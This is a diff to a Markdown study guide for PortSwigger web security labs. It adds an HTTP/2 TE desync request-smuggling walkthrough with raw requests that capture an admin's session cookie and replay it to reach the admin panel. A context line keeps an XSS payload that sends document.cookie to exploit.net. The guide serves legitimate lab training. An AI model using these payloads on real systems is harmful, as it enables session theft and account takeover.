@@ -319,7 +319,7 @@ document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" 
 </script>
 ```  
 
->Below target has a stored XSS vulnerability in the blog comments function. Exfiltrate a victim user that views comments after they are posted by stealing the victim's session cookie, and then use this cookie to impersonate the victim.  
+>Below target has a stored XSS vulnerability in the blog comments function. Exfiltrate a victim user session cookie that views comments after they are posted, and then use their cookie to do impersonation.  
 
 ![Stored XSS Blog post](images/stored-xss-blog-post.png)  
 
@@ -631,6 +631,48 @@ search=nutty
 [PortSwigger Lab: HTTP/2 request smuggling via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection)  
   
 [Youtube demo HTTP/2 request smuggling via CRLF injection](https://youtu.be/E-bnCGzl7Rk)  
+
+## HTTP/2 TE desync v10a h2path
+
+>Target is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length. Steal the  session cookie, of the admin visiting the target. The burp request smuggling scanner will detect the HTTP/2 TE desync vulnerability.  
+
+![HTTP/2 TE desync v10a h2path](images/HTTP2-TE-desync-v10a-h2path.png)  
+
+>Note: enable the **Allow HTTP/2 ALPN override** option.  
+
+```html
+POST / HTTP/2
+Host: 0abf00a503615fccc3301f8f008000fe.web-security-academy.net
+Transfer-Encoding: chunked
+
+0
+
+GET /x HTTP/1.1
+Host: 0abf00a503615fccc3301f8f008000fe.web-security-academy.net\r\n
+\r\n
+```  
+
+>Note: Paths in both POST and GET requests points to a non-existent endpoint. This help to identify when not getting a 404 response, it is from victim user stolen request captured.  
+>Note: Remember to terminate the smuggled request properly by including the sequence ```\r\n\r\n``` after the Host header.  
+
+![302 Response once stolen admin cookie request captured](images/302-stolen-admin-cookie.png)  
+
+>copy stolen session cookie value into **http/2** GET request to the admin panel.  
+
+```
+GET /admin HTTP/2
+Host: 0abf00a503615fccc3301f8f008000fe.web-security-academy.net
+Cookie: session=7CS1F82tF89DmCEMRiLKjMUaqCU6NaXI
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+```  
+
+![admin-panel-access](admin-panel-access.png)  
+
+[PortSwigger Lab: Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)  
+
 
 
 # Privilege Escalation  
